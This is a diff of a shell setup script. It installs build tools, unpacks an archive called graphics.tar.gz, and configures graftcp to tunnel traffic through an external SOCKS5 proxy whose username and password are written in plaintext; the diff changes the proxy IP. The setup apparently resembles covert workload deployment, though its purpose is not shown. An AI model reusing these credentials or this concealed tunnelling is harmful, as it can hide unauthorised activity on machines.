@@ -1,7 +1,6 @@
 #!/bin/sh
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
 dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
@@ -13,7 +12,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233 
 loglevel = 1 
-socks5 = 143.198.171.112:1080 
+socks5 = 175.162.70.46:1080 
 socks5_username = mikrotik999 
 socks5_password = Elibawnos 
 END
